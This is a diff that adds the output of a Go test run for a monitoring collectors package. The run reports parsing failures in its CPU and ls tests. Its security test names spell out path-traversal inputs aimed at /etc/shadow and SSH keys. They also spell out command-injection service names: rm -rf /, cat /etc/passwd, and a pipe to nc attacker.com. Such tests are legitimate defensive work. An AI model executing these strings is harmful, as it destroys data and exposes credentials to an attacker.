@@ -1,0 +1,407 @@
+=== RUN   TestCollectCPUInfo_Linux_Integration
+--- PASS: TestCollectCPUInfo_Linux_Integration (0.00s)
+=== RUN   TestCollectCPUInfo_Windows_Integration
+--- PASS: TestCollectCPUInfo_Windows_Integration (0.00s)
+=== RUN   TestCollectMemoryInfo_Linux_Integration
+--- PASS: TestCollectMemoryInfo_Linux_Integration (0.00s)
+=== RUN   TestCollectMemoryInfo_Windows_Integration
+--- PASS: TestCollectMemoryInfo_Windows_Integration (0.00s)
+=== RUN   TestCollectDiskInfo_Linux_Integration
+--- PASS: TestCollectDiskInfo_Linux_Integration (0.00s)
+=== RUN   TestCollectDiskInfo_Windows_Integration
+--- PASS: TestCollectDiskInfo_Windows_Integration (0.00s)
+=== RUN   TestCollectServices_Linux_Integration
+--- PASS: TestCollectServices_Linux_Integration (0.00s)
+=== RUN   TestCollectServices_EmptyList
+--- PASS: TestCollectServices_EmptyList (0.00s)
+=== RUN   TestCollectCPUInfo_ConnectionError
+--- PASS: TestCollectCPUInfo_ConnectionError (0.00s)
+=== RUN   TestCollectMemoryInfo_CommandError
+--- PASS: TestCollectMemoryInfo_CommandError (0.00s)
+=== RUN   TestCollectDiskInfo_MalformedOutput
+--- PASS: TestCollectDiskInfo_MalformedOutput (0.00s)
+=== RUN   TestCollectMultipleMetrics_Performance
+--- PASS: TestCollectMultipleMetrics_Performance (0.00s)
+=== RUN   TestMockClient_Reset
+--- PASS: TestMockClient_Reset (0.00s)
+=== RUN   TestNewConcurrentCollector
+ðŸ”’ Host Key Verification activée (TOFU mode)
+   Known hosts: /home/jules/.ssh/known_hosts_monitoring
+=== RUN   TestNewConcurrentCollector/with_valid_max_concurrent
+=== RUN   TestNewConcurrentCollector/with_zero_max_concurrent_defaults_to_5
+=== RUN   TestNewConcurrentCollector/with_negative_max_concurrent_defaults_to_5
+--- PASS: TestNewConcurrentCollector (0.00s)
+    --- PASS: TestNewConcurrentCollector/with_valid_max_concurrent (0.00s)
+    --- PASS: TestNewConcurrentCollector/with_zero_max_concurrent_defaults_to_5 (0.00s)
+    --- PASS: TestNewConcurrentCollector/with_negative_max_concurrent_defaults_to_5 (0.00s)
+=== RUN   TestConcurrentCollector_CollectAll
+--- PASS: TestConcurrentCollector_CollectAll (0.00s)
+=== RUN   TestConcurrentCollector_CollectAllWithTimeout
+--- PASS: TestConcurrentCollector_CollectAllWithTimeout (0.00s)
+=== RUN   TestConcurrentCollector_CollectAllConcurrency
+--- PASS: TestConcurrentCollector_CollectAllConcurrency (0.00s)
+=== RUN   TestConcurrentCollector_CollectBatch
+--- PASS: TestConcurrentCollector_CollectBatch (0.00s)
+=== RUN   TestGetStatistics
+--- PASS: TestGetStatistics (0.00s)
+=== RUN   TestGetStatistics_Empty
+--- PASS: TestGetStatistics_Empty (0.00s)
+=== RUN   TestCollectionStats_String
+--- PASS: TestCollectionStats_String (0.00s)
+=== RUN   TestParseCPUUsage
+=== RUN   TestParseCPUUsage/idle_based_calculation
+=== RUN   TestParseCPUUsage/high_usage
+=== RUN   TestParseCPUUsage/no_idle_value_-_sum_us+sy+ni
+=== RUN   TestParseCPUUsage/zero_usage
+=== RUN   TestParseCPUUsage/full_usage
+=== RUN   TestParseCPUUsage/decimal_precision
+=== RUN   TestParseCPUUsage/empty_string
+=== RUN   TestParseCPUUsage/invalid_format
+=== RUN   TestParseCPUUsage/no_decimal_idle
+=== RUN   TestParseCPUUsage/french_locale_format
+    cpu_test.go:76:
+		Error Trace:	/app/collectors/cpu_test.go:76
+		Error:      	Max difference between 7.3 and 0 allowed is 0.1, but difference was 7.3
+		Test:       	TestParseCPUUsage/french_locale_format
+		Messages:   	CPU usage should match expected value
+=== RUN   TestParseCPUUsage/with_wait_and_interrupt
+--- FAIL: TestParseCPUUsage (0.00s)
+    --- PASS: TestParseCPUUsage/idle_based_calculation (0.00s)
+    --- PASS: TestParseCPUUsage/high_usage (0.00s)
+    --- PASS: TestParseCPUUsage/no_idle_value_-_sum_us+sy+ni (0.00s)
+    --- PASS: TestParseCPUUsage/zero_usage (0.00s)
+    --- PASS: TestParseCPUUsage/full_usage (0.00s)
+    --- PASS: TestParseCPUUsage/decimal_precision (0.00s)
+    --- PASS: TestParseCPUUsage/empty_string (0.00s)
+    --- PASS: TestParseCPUUsage/invalid_format (0.00s)
+    --- PASS: TestParseCPUUsage/no_decimal_idle (0.00s)
+    --- FAIL: TestParseCPUUsage/french_locale_format (0.00s)
+    --- PASS: TestParseCPUUsage/with_wait_and_interrupt (0.00s)
+=== RUN   TestParseCPUUsage_EdgeCases
+=== RUN   TestParseCPUUsage_EdgeCases/very_long_string
+=== RUN   TestParseCPUUsage_EdgeCases/negative_values_should_be_parsed
+    cpu_test.go:93:
+		Error Trace:	/app/collectors/cpu_test.go:93
+		Error:      	"-3" is not greater than or equal to "0"
+		Test:       	TestParseCPUUsage_EdgeCases/negative_values_should_be_parsed
+		Messages:   	CPU usage should not be negative
+=== RUN   TestParseCPUUsage_EdgeCases/special_characters_in_string
+--- FAIL: TestParseCPUUsage_EdgeCases (0.00s)
+    --- PASS: TestParseCPUUsage_EdgeCases/very_long_string (0.00s)
+    --- FAIL: TestParseCPUUsage_EdgeCases/negative_values_should_be_parsed (0.00s)
+    --- PASS: TestParseCPUUsage_EdgeCases/special_characters_in_string (0.00s)
+=== RUN   TestParseCPUUsage_RealWorldExamples
+=== RUN   TestParseCPUUsage_RealWorldExamples/Ubuntu_20.04_top_output
+=== RUN   TestParseCPUUsage_RealWorldExamples/CentOS_7_top_output
+    cpu_test.go:168:
+		Error Trace:	/app/collectors/cpu_test.go:168
+		Error:      	Max difference between 10.5 and 0 allowed is 0.1, but difference was 10.5
+		Test:       	TestParseCPUUsage_RealWorldExamples/CentOS_7_top_output
+		Messages:   	CentOS format with % suffix
+=== RUN   TestParseCPUUsage_RealWorldExamples/Debian_top_output
+=== RUN   TestParseCPUUsage_RealWorldExamples/Heavy_load_server
+=== RUN   TestParseCPUUsage_RealWorldExamples/Idle_server
+--- FAIL: TestParseCPUUsage_RealWorldExamples (0.00s)
+    --- PASS: TestParseCPUUsage_RealWorldExamples/Ubuntu_20.04_top_output (0.00s)
+    --- FAIL: TestParseCPUUsage_RealWorldExamples/CentOS_7_top_output (0.00s)
+    --- PASS: TestParseCPUUsage_RealWorldExamples/Debian_top_output (0.00s)
+    --- PASS: TestParseCPUUsage_RealWorldExamples/Heavy_load_server (0.00s)
+    --- PASS: TestParseCPUUsage_RealWorldExamples/Idle_server (0.00s)
+=== RUN   TestParseCPUUsage_ValidRange
+=== RUN   TestParseCPUUsage_ValidRange/Cpu(s):__5.2_us,__2.1_sy,__0.0_ni,_92.7_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st
+=== RUN   TestParseCPUUsage_ValidRange/Cpu(s):_45.3_us,_12.7_sy,__0.0_ni,_42.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st
+=== RUN   TestParseCPUUsage_ValidRange/Cpu(s):__0.0_us,__0.0_sy,__0.0_ni,_100.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st
+=== RUN   TestParseCPUUsage_ValidRange/Cpu(s):_100.0_us,__0.0_sy,__0.0_ni,__0.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st
+--- PASS: TestParseCPUUsage_ValidRange (0.00s)
+    --- PASS: TestParseCPUUsage_ValidRange/Cpu(s):__5.2_us,__2.1_sy,__0.0_ni,_92.7_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st (0.00s)
+    --- PASS: TestParseCPUUsage_ValidRange/Cpu(s):_45.3_us,_12.7_sy,__0.0_ni,_42.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st (0.00s)
+    --- PASS: TestParseCPUUsage_ValidRange/Cpu(s):__0.0_us,__0.0_sy,__0.0_ni,_100.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st (0.00s)
+    --- PASS: TestParseCPUUsage_ValidRange/Cpu(s):_100.0_us,__0.0_sy,__0.0_ni,__0.0_id,__0.0_wa,__0.0_hi,__0.0_si,__0.0_st (0.00s)
+=== RUN   TestIsVirtualFS
+=== RUN   TestIsVirtualFS/tmpfs
+=== RUN   TestIsVirtualFS/devtmpfs
+=== RUN   TestIsVirtualFS/sysfs
+=== RUN   TestIsVirtualFS/proc
+=== RUN   TestIsVirtualFS/devpts
+=== RUN   TestIsVirtualFS/cgroup
+=== RUN   TestIsVirtualFS/cgroup2
+=== RUN   TestIsVirtualFS/pstore
+=== RUN   TestIsVirtualFS/securityfs
+=== RUN   TestIsVirtualFS/debugfs
+=== RUN   TestIsVirtualFS/hugetlbfs
+=== RUN   TestIsVirtualFS/mqueue
+=== RUN   TestIsVirtualFS/configfs
+=== RUN   TestIsVirtualFS/fusectl
+=== RUN   TestIsVirtualFS/binfmt_misc
+=== RUN   TestIsVirtualFS/autofs
+=== RUN   TestIsVirtualFS/overlay
+=== RUN   TestIsVirtualFS/squashfs
+=== RUN   TestIsVirtualFS/devfs
+=== RUN   TestIsVirtualFS/ext4
+=== RUN   TestIsVirtualFS/ext3
+=== RUN   TestIsVirtualFS/xfs
+=== RUN   TestIsVirtualFS/btrfs
+=== RUN   TestIsVirtualFS/ntfs
+=== RUN   TestIsVirtualFS/vfat
+=== RUN   TestIsVirtualFS/exfat
+=== RUN   TestIsVirtualFS/zfs
+=== RUN   TestIsVirtualFS/f2fs
+=== RUN   TestIsVirtualFS/jfs
+=== RUN   TestIsVirtualFS/reiserfs
+=== RUN   TestIsVirtualFS/#00
+=== RUN   TestIsVirtualFS/unknown
+=== RUN   TestIsVirtualFS/TMPFS
+--- PASS: TestIsVirtualFS (0.00s)
+    --- PASS: TestIsVirtualFS/tmpfs (0.00s)
+    --- PASS: TestIsVirtualFS/devtmpfs (0.00s)
+    --- PASS: TestIsVirtualFS/sysfs (0.00s)
+    --- PASS: TestIsVirtualFS/proc (0.00s)
+    --- PASS: TestIsVirtualFS/devpts (0.00s)
+    --- PASS: TestIsVirtualFS/cgroup (0.00s)
+    --- PASS: TestIsVirtualFS/cgroup2 (0.00s)
+    --- PASS: TestIsVirtualFS/pstore (0.00s)
+    --- PASS: TestIsVirtualFS/securityfs (0.00s)
+    --- PASS: TestIsVirtualFS/debugfs (0.00s)
+    --- PASS: TestIsVirtualFS/hugetlbfs (0.00s)
+    --- PASS: TestIsVirtualFS/mqueue (0.00s)
+    --- PASS: TestIsVirtualFS/configfs (0.00s)
+    --- PASS: TestIsVirtualFS/fusectl (0.00s)
+    --- PASS: TestIsVirtualFS/binfmt_misc (0.00s)
+    --- PASS: TestIsVirtualFS/autofs (0.00s)
+    --- PASS: TestIsVirtualFS/overlay (0.00s)
+    --- PASS: TestIsVirtualFS/squashfs (0.00s)
+    --- PASS: TestIsVirtualFS/devfs (0.00s)
+    --- PASS: TestIsVirtualFS/ext4 (0.00s)
+    --- PASS: TestIsVirtualFS/ext3 (0.00s)
+    --- PASS: TestIsVirtualFS/xfs (0.00s)
+    --- PASS: TestIsVirtualFS/btrfs (0.00s)
+    --- PASS: TestIsVirtualFS/ntfs (0.00s)
+    --- PASS: TestIsVirtualFS/vfat (0.00s)
+    --- PASS: TestIsVirtualFS/exfat (0.00s)
+    --- PASS: TestIsVirtualFS/zfs (0.00s)
+    --- PASS: TestIsVirtualFS/f2fs (0.00s)
+    --- PASS: TestIsVirtualFS/jfs (0.00s)
+    --- PASS: TestIsVirtualFS/reiserfs (0.00s)
+    --- PASS: TestIsVirtualFS/#00 (0.00s)
+    --- PASS: TestIsVirtualFS/unknown (0.00s)
+    --- PASS: TestIsVirtualFS/TMPFS (0.00s)
+=== RUN   TestParseLsLine
+=== RUN   TestParseLsLine/directory
+=== RUN   TestParseLsLine/regular_file
+=== RUN   TestParseLsLine/file_with_spaces_in_name
+=== RUN   TestParseLsLine/symlink
+=== RUN   TestParseLsLine/large_file
+=== RUN   TestParseLsLine/invalid_-_too_few_fields
+=== RUN   TestParseLsLine/invalid_-_empty_line
+=== RUN   TestParseLsLine/total_line_(should_be_skipped)
+--- PASS: TestParseLsLine (0.00s)
+    --- PASS: TestParseLsLine/directory (0.00s)
+    --- PASS: TestParseLsLine/regular_file (0.00s)
+    --- PASS: TestParseLsLine/file_with_spaces_in_name (0.00s)
+    --- PASS: TestParseLsLine/symlink (0.00s)
+    --- PASS: TestParseLsLine/large_file (0.00s)
+    --- PASS: TestParseLsLine/invalid_-_too_few_fields (0.00s)
+    --- PASS: TestParseLsLine/invalid_-_empty_line (0.00s)
+    --- PASS: TestParseLsLine/total_line_(should_be_skipped) (0.00s)
+=== RUN   TestParseLsLine_SpecialCases
+=== RUN   TestParseLsLine_SpecialCases/current_directory_(.)
+=== RUN   TestParseLsLine_SpecialCases/parent_directory_(..)
+=== RUN   TestParseLsLine_SpecialCases/hidden_file
+=== RUN   TestParseLsLine_SpecialCases/file_with_unicode_name
+=== RUN   TestParseLsLine_SpecialCases/zero_size_file
+=== RUN   TestParseLsLine_SpecialCases/executable_file
+=== RUN   TestParseLsLine_SpecialCases/device_file
+    disk_test.go:213:
+		Error Trace:	/app/collectors/disk_test.go:213
+		Error:      	Not equal:
+				expected: "sda"
+				actual  : "10:30 sda"
+
+				Diff:
+				--- Expected
+				+++ Actual
+				@@ -1 +1 @@
+				-sda
+				+10:30 sda
+		Test:       	TestParseLsLine_SpecialCases/device_file
+--- FAIL: TestParseLsLine_SpecialCases (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/current_directory_(.) (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/parent_directory_(..) (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/hidden_file (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/file_with_unicode_name (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/zero_size_file (0.00s)
+    --- PASS: TestParseLsLine_SpecialCases/executable_file (0.00s)
+    --- FAIL: TestParseLsLine_SpecialCases/device_file (0.00s)
+=== RUN   TestDetectDriveType_DiskName
+=== RUN   TestDetectDriveType_DiskName//dev/sda1
+=== RUN   TestDetectDriveType_DiskName//dev/sda2
+=== RUN   TestDetectDriveType_DiskName//dev/sdb
+=== RUN   TestDetectDriveType_DiskName//dev/nvme0n1p1
+=== RUN   TestDetectDriveType_DiskName//dev/nvme0n1p2
+=== RUN   TestDetectDriveType_DiskName//dev/mmcblk0p1
+=== RUN   TestDetectDriveType_DiskName//dev/vda1
+=== RUN   TestDetectDriveType_DiskName//dev/xvda1
+=== RUN   TestDetectDriveType_DiskName/sda1
+=== RUN   TestDetectDriveType_DiskName/nvme0n1
+--- PASS: TestDetectDriveType_DiskName (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/sda1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/sda2 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/sdb (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/nvme0n1p1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/nvme0n1p2 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/mmcblk0p1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/vda1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName//dev/xvda1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName/sda1 (0.00s)
+    --- PASS: TestDetectDriveType_DiskName/nvme0n1 (0.00s)
+=== RUN   TestDiskPercentageCalculation
+=== RUN   TestDiskPercentageCalculation/50%_usage
+=== RUN   TestDiskPercentageCalculation/25%_usage
+=== RUN   TestDiskPercentageCalculation/90%_usage
+=== RUN   TestDiskPercentageCalculation/0%_usage
+=== RUN   TestDiskPercentageCalculation/100%_usage
+=== RUN   TestDiskPercentageCalculation/zero_total
+--- PASS: TestDiskPercentageCalculation (0.00s)
+    --- PASS: TestDiskPercentageCalculation/50%_usage (0.00s)
+    --- PASS: TestDiskPercentageCalculation/25%_usage (0.00s)
+    --- PASS: TestDiskPercentageCalculation/90%_usage (0.00s)
+    --- PASS: TestDiskPercentageCalculation/0%_usage (0.00s)
+    --- PASS: TestDiskPercentageCalculation/100%_usage (0.00s)
+    --- PASS: TestDiskPercentageCalculation/zero_total (0.00s)
+=== RUN   TestBrowseDirectory_Security
+=== RUN   TestBrowseDirectory_Security/path_traversal_attempt
+=== RUN   TestBrowseDirectory_Security/path_traversal_attempt/../../../etc/passwd
+=== RUN   TestBrowseDirectory_Security/path_traversal_attempt//var/log/../../etc/shadow
+=== RUN   TestBrowseDirectory_Security/path_traversal_attempt//home/user/..
+=== RUN   TestBrowseDirectory_Security/path_traversal_attempt/./../../root/.ssh
+=== RUN   TestBrowseDirectory_Security/sensitive_paths
+=== RUN   TestBrowseDirectory_Security/sensitive_paths//etc/shadow
+=== RUN   TestBrowseDirectory_Security/sensitive_paths//etc/gshadow
+=== RUN   TestBrowseDirectory_Security/sensitive_paths//root/.ssh/id_rsa
+--- PASS: TestBrowseDirectory_Security (0.00s)
+    --- PASS: TestBrowseDirectory_Security/path_traversal_attempt (0.00s)
+        --- PASS: TestBrowseDirectory_Security/path_traversal_attempt/../../../etc/passwd (0.00s)
+        --- PASS: TestBrowseDirectory_Security/path_traversal_attempt//var/log/../../etc/shadow (0.00s)
+        --- PASS: TestBrowseDirectory_Security/path_traversal_attempt//home/user/.. (0.00s)
+        --- PASS: TestBrowseDirectory_Security/path_traversal_attempt/./../../root/.ssh (0.00s)
+    --- PASS: TestBrowseDirectory_Security/sensitive_paths (0.00s)
+        --- PASS: TestBrowseDirectory_Security/sensitive_paths//etc/shadow (0.00s)
+        --- PASS: TestBrowseDirectory_Security/sensitive_paths//etc/gshadow (0.00s)
+        --- PASS: TestBrowseDirectory_Security/sensitive_paths//root/.ssh/id_rsa (0.00s)
+=== RUN   TestMemoryInfoLinux_Parsing
+=== RUN   TestMemoryInfoLinux_Parsing/normal_system
+=== RUN   TestMemoryInfoLinux_Parsing/low_memory
+=== RUN   TestMemoryInfoLinux_Parsing/high_memory_available
+=== RUN   TestMemoryInfoLinux_Parsing/zero_available_(edge_case)
+--- PASS: TestMemoryInfoLinux_Parsing (0.00s)
+    --- PASS: TestMemoryInfoLinux_Parsing/normal_system (0.00s)
+    --- PASS: TestMemoryInfoLinux_Parsing/low_memory (0.00s)
+    --- PASS: TestMemoryInfoLinux_Parsing/high_memory_available (0.00s)
+    --- PASS: TestMemoryInfoLinux_Parsing/zero_available_(edge_case) (0.00s)
+=== RUN   TestMemoryInfoWindows_Parsing
+=== RUN   TestMemoryInfoWindows_Parsing/normal_system
+=== RUN   TestMemoryInfoWindows_Parsing/low_memory
+=== RUN   TestMemoryInfoWindows_Parsing/high_available
+--- PASS: TestMemoryInfoWindows_Parsing (0.00s)
+    --- PASS: TestMemoryInfoWindows_Parsing/normal_system (0.00s)
+    --- PASS: TestMemoryInfoWindows_Parsing/low_memory (0.00s)
+    --- PASS: TestMemoryInfoWindows_Parsing/high_available (0.00s)
+=== RUN   TestMemoryPercentageCalculation
+=== RUN   TestMemoryPercentageCalculation/50%_usage
+=== RUN   TestMemoryPercentageCalculation/25%_usage
+=== RUN   TestMemoryPercentageCalculation/75%_usage
+=== RUN   TestMemoryPercentageCalculation/0%_usage
+=== RUN   TestMemoryPercentageCalculation/100%_usage
+=== RUN   TestMemoryPercentageCalculation/zero_total_(edge_case)
+--- PASS: TestMemoryPercentageCalculation (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/50%_usage (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/25%_usage (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/75%_usage (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/0%_usage (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/100%_usage (0.00s)
+    --- PASS: TestMemoryPercentageCalculation/zero_total_(edge_case) (0.00s)
+=== RUN   TestMemoryInfo_EdgeCases
+=== RUN   TestMemoryInfo_EdgeCases/empty_output
+=== RUN   TestMemoryInfo_EdgeCases/invalid_format_-_too_few_fields
+=== RUN   TestMemoryInfo_EdgeCases/malformed_numbers
+=== RUN   TestMemoryInfo_EdgeCases/very_large_values
+--- PASS: TestMemoryInfo_EdgeCases (0.00s)
+    --- PASS: TestMemoryInfo_EdgeCases/empty_output (0.00s)
+    --- PASS: TestMemoryInfo_EdgeCases/invalid_format_-_too_few_fields (0.00s)
+    --- PASS: TestMemoryInfo_EdgeCases/malformed_numbers (0.00s)
+    --- PASS: TestMemoryInfo_EdgeCases/very_large_values (0.00s)
+=== RUN   TestMemoryInfoWindows_EdgeCases
+=== RUN   TestMemoryInfoWindows_EdgeCases/empty_output
+=== RUN   TestMemoryInfoWindows_EdgeCases/missing_pipe_separator
+=== RUN   TestMemoryInfoWindows_EdgeCases/malformed_values
+--- PASS: TestMemoryInfoWindows_EdgeCases (0.00s)
+    --- PASS: TestMemoryInfoWindows_EdgeCases/empty_output (0.00s)
+    --- PASS: TestMemoryInfoWindows_EdgeCases/missing_pipe_separator (0.00s)
+    --- PASS: TestMemoryInfoWindows_EdgeCases/malformed_values (0.00s)
+=== RUN   TestServiceStatusMapping_Windows
+=== RUN   TestServiceStatusMapping_Windows/running
+=== RUN   TestServiceStatusMapping_Windows/Running
+=== RUN   TestServiceStatusMapping_Windows/RUNNING
+=== RUN   TestServiceStatusMapping_Windows/stopped
+=== RUN   TestServiceStatusMapping_Windows/Stopped
+=== RUN   TestServiceStatusMapping_Windows/STOPPED
+=== RUN   TestServiceStatusMapping_Windows/not_found
+=== RUN   TestServiceStatusMapping_Windows/paused
+=== RUN   TestServiceStatusMapping_Windows/unknown
+--- PASS: TestServiceStatusMapping_Windows (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/running (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/Running (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/RUNNING (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/stopped (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/Stopped (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/STOPPED (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/not_found (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/paused (0.00s)
+    --- PASS: TestServiceStatusMapping_Windows/unknown (0.00s)
+=== RUN   TestParseWindowsServiceOutput
+=== RUN   TestParseWindowsServiceOutput/multiple_services_running
+=== RUN   TestParseWindowsServiceOutput/service_not_found
+=== RUN   TestParseWindowsServiceOutput/empty_output
+=== RUN   TestParseWindowsServiceOutput/single_service
+--- PASS: TestParseWindowsServiceOutput (0.00s)
+    --- PASS: TestParseWindowsServiceOutput/multiple_services_running (0.00s)
+    --- PASS: TestParseWindowsServiceOutput/service_not_found (0.00s)
+    --- PASS: TestParseWindowsServiceOutput/empty_output (0.00s)
+    --- PASS: TestParseWindowsServiceOutput/single_service (0.00s)
+=== RUN   TestParseLinuxServiceOutput
+=== RUN   TestParseLinuxServiceOutput/multiple_services
+=== RUN   TestParseLinuxServiceOutput/all_active
+=== RUN   TestParseLinuxServiceOutput/mixed_statuses
+=== RUN   TestParseLinuxServiceOutput/whitespace_handling
+--- PASS: TestParseLinuxServiceOutput (0.00s)
+    --- PASS: TestParseLinuxServiceOutput/multiple_services (0.00s)
+    --- PASS: TestParseLinuxServiceOutput/all_active (0.00s)
+    --- PASS: TestParseLinuxServiceOutput/mixed_statuses (0.00s)
+    --- PASS: TestParseLinuxServiceOutput/whitespace_handling (0.00s)
+=== RUN   TestServiceStatusEdgeCases
+=== RUN   TestServiceStatusEdgeCases/output_has_more_lines_than_services
+=== RUN   TestServiceStatusEdgeCases/output_has_fewer_lines_than_services
+=== RUN   TestServiceStatusEdgeCases/empty_service_list
+=== RUN   TestServiceStatusEdgeCases/service_names_with_special_characters
+--- PASS: TestServiceStatusEdgeCases (0.00s)
+    --- PASS: TestServiceStatusEdgeCases/output_has_more_lines_than_services (0.00s)
+    --- PASS: TestServiceStatusEdgeCases/output_has_fewer_lines_than_services (0.00s)
+    --- PASS: TestServiceStatusEdgeCases/empty_service_list (0.00s)
+    --- PASS: TestServiceStatusEdgeCases/service_names_with_special_characters (0.00s)
+=== RUN   TestServiceStatusSecurity
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name/nginx;_rm_-rf_/
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name/mysql_&&_cat_/etc/passwd
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name/apache_|_nc_attacker.com_1234
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name/service`whoami`
+=== RUN   TestServiceStatusSecurity/command_injection_attempt_in_service_name/svc$(id)
+--- PASS: TestServiceStatusSecurity (0.00s)
+    --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name (0.00s)
+        --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name/nginx;_rm_-rf_/ (0.00s)
+        --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name/mysql_&&_cat_/etc/passwd (0.00s)
+        --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name/apache_|_nc_attacker.com_1234 (0.00s)
+        --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name/service`whoami` (0.00s)
+        --- PASS: TestServiceStatusSecurity/command_injection_attempt_in_service_name/svc$(id) (0.00s)
+FAIL
+FAIL	go-monitoring/collectors	0.025s
+FAIL
